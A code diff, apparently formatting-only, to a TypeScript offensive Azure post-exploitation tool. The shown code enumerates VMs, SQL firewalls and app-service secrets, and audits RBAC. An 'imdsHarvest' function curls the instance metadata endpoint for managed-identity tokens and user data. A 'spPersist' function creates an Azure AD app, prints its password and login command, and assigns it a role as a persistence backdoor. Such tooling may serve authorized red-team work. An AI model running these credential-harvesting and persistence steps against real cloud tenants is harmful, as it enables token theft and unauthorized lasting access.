@@ -1234,7 +1234,8 @@ async function vmEnum(args: string[], timeout: number): Promise<HookResult> {
 
   const rgArgs = rg ? ["--resource-group", rg] : []
   const vms = await az(["vm", "list", ...rgArgs, "--show-details"], sub, timeout)
-  if (vms.exitCode !== 0) return { output: output.join("\n") + `[-] Cannot list VMs: ${vms.stderr.slice(0, 200)}`, findings }
+  if (vms.exitCode !== 0)
+    return { output: output.join("\n") + `[-] Cannot list VMs: ${vms.stderr.slice(0, 200)}`, findings }
 
   const items = tryJson(vms.stdout) || []
   output.push(`[+] VMs: ${items.length}\n`)
@@ -1259,7 +1260,11 @@ async function vmEnum(args: string[], timeout: number): Promise<HookResult> {
       })
     }
 
-    const extensions = await az(["vm", "extension", "list", "--vm-name", vm.name, "--resource-group", vm.resourceGroup], sub, 15)
+    const extensions = await az(
+      ["vm", "extension", "list", "--vm-name", vm.name, "--resource-group", vm.resourceGroup],
+      sub,
+      15,
+    )
     if (extensions.exitCode === 0) {
       const exts = tryJson(extensions.stdout) || []
       if (exts.length > 0) {
@@ -1343,8 +1348,9 @@ async function rbacAudit(args: string[], timeout: number): Promise<HookResult> {
   output.push(`[+] Total role assignments: ${items.length}\n`)
 
   const dangerousRoles = ["Owner", "Contributor", "User Access Administrator"]
-  const subLevel = items.filter((a: Record<string, string>) =>
-    a.scope?.match(/^\/subscriptions\/[^/]+$/) && dangerousRoles.includes(a.roleDefinitionName),
+  const subLevel = items.filter(
+    (a: Record<string, string>) =>
+      a.scope?.match(/^\/subscriptions\/[^/]+$/) && dangerousRoles.includes(a.roleDefinitionName),
   )
 
   if (subLevel.length > 0) {
@@ -1407,7 +1413,11 @@ async function sqlEnumAzure(args: string[], timeout: number): Promise<HookResult
   const output: string[] = ["[*] Enumerating Azure SQL...\n"]
 
   const servers = server
-    ? await az(["sql", "server", "show", "--name", server, "--resource-group", argVal(args, "--resource-group") || ""], sub, timeout)
+    ? await az(
+        ["sql", "server", "show", "--name", server, "--resource-group", argVal(args, "--resource-group") || ""],
+        sub,
+        timeout,
+      )
     : await az(["sql", "server", "list"], sub, timeout)
 
   if (servers.exitCode !== 0) return { output: output.join("\n") + "[-] Cannot list SQL servers", findings }
@@ -1435,7 +1445,11 @@ async function sqlEnumAzure(args: string[], timeout: number): Promise<HookResult
       })
     }
 
-    const firewall = await az(["sql", "server", "firewall-rule", "list", "--server", srv.name, "--resource-group", srv.resourceGroup], sub, 15)
+    const firewall = await az(
+      ["sql", "server", "firewall-rule", "list", "--server", srv.name, "--resource-group", srv.resourceGroup],
+      sub,
+      15,
+    )
     if (firewall.exitCode === 0) {
       const rules = tryJson(firewall.stdout) || []
       output.push(`    Firewall rules: ${rules.length}`)
@@ -1508,7 +1522,11 @@ async function appServiceEnum(args: string[], timeout: number): Promise<HookResu
       })
     }
 
-    const settings = await az(["webapp", "config", "appsettings", "list", "--name", app.name, "--resource-group", app.resourceGroup], sub, 15)
+    const settings = await az(
+      ["webapp", "config", "appsettings", "list", "--name", app.name, "--resource-group", app.resourceGroup],
+      sub,
+      15,
+    )
     if (settings.exitCode === 0) {
       const settingList = tryJson(settings.stdout) || []
       for (const s of settingList) {
@@ -1528,7 +1546,11 @@ async function appServiceEnum(args: string[], timeout: number): Promise<HookResu
       }
     }
 
-    const connStrings = await az(["webapp", "config", "connection-string", "list", "--name", app.name, "--resource-group", app.resourceGroup], sub, 15)
+    const connStrings = await az(
+      ["webapp", "config", "connection-string", "list", "--name", app.name, "--resource-group", app.resourceGroup],
+      sub,
+      15,
+    )
     if (connStrings.exitCode === 0) {
       const cs = tryJson(connStrings.stdout)
       if (cs) {
@@ -1561,7 +1583,14 @@ async function imdsHarvest(args: string[]): Promise<HookResult> {
 
   const meta = await run(
     "curl",
-    ["-s", "--max-time", "5", "-H", "Metadata: true", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"],
+    [
+      "-s",
+      "--max-time",
+      "5",
+      "-H",
+      "Metadata: true",
+      "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    ],
     10,
   )
   if (meta.exitCode !== 0 || !meta.stdout.includes("vmId")) {
@@ -1589,7 +1618,14 @@ async function imdsHarvest(args: string[]): Promise<HookResult> {
 
   const token = await run(
     "curl",
-    ["-s", "--max-time", "5", "-H", "Metadata: true", `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${resource}`],
+    [
+      "-s",
+      "--max-time",
+      "5",
+      "-H",
+      "Metadata: true",
+      `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${resource}`,
+    ],
     10,
   )
   if (token.exitCode === 0) {
@@ -1614,7 +1650,14 @@ async function imdsHarvest(args: string[]): Promise<HookResult> {
 
   const userData = await run(
     "curl",
-    ["-s", "--max-time", "5", "-H", "Metadata: true", "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"],
+    [
+      "-s",
+      "--max-time",
+      "5",
+      "-H",
+      "Metadata: true",
+      "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text",
+    ],
     10,
   )
   if (userData.exitCode === 0 && userData.stdout.trim()) {
@@ -1694,7 +1737,8 @@ async function spPersist(args: string[], timeout: number): Promise<HookResult> {
   if (!name) return { output: "[-] --name required", findings }
 
   const create = await az(["ad", "app", "create", "--display-name", name], undefined, timeout)
-  if (create.exitCode !== 0) return { output: output.join("\n") + `[-] App creation failed: ${create.stderr.slice(0, 200)}`, findings }
+  if (create.exitCode !== 0)
+    return { output: output.join("\n") + `[-] App creation failed: ${create.stderr.slice(0, 200)}`, findings }
 
   const app = tryJson(create.stdout)
   if (!app?.appId) return { output: output.join("\n") + "[-] Could not parse app response", findings }
@@ -1717,12 +1761,18 @@ async function spPersist(args: string[], timeout: number): Promise<HookResult> {
       output.push(`    Tenant: ${cred.tenant}`)
       output.push(`    App ID: ${cred.appId}`)
       output.push(`    Password: ${cred.password}`)
-      output.push(`\n    Login: az login --service-principal -u ${cred.appId} -p '${cred.password}' --tenant ${cred.tenant}`)
+      output.push(
+        `\n    Login: az login --service-principal -u ${cred.appId} -p '${cred.password}' --tenant ${cred.tenant}`,
+      )
     }
   }
 
   if (scope) {
-    const assign = await az(["role", "assignment", "create", "--assignee", app.appId, "--role", role, "--scope", scope], undefined, timeout)
+    const assign = await az(
+      ["role", "assignment", "create", "--assignee", app.appId, "--role", role, "--scope", scope],
+      undefined,
+      timeout,
+    )
     output.push(
       assign.exitCode === 0
         ? `[+] Role "${role}" assigned at scope: ${scope}`
